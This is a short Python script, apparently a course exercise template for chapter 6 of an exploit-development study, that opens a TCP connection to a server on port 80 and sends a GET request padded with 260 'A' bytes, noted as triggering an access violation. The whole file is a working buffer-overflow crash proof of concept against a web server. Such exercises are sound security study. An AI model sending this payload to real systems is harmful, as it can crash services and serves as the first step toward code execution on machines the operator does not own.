"""
OMER: Generated this template for following along on Ch6

"""

import socket
import sys
import struct


def send_crash(server, port):
    size = 260  # Triggered AV

    buffer = b"GET /"
    buffer += b"\x41" * size
    buffer += b"\r\n\r\n"
    print(f"[+] Sending Buffer: {buffer}")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()


if __name__ == "__main__":
    try:
        server = sys.argv[1]
        port = 80
        send_crash(server=server, port=port)

        print("Done!")
    except Exception as e:
        print(e)
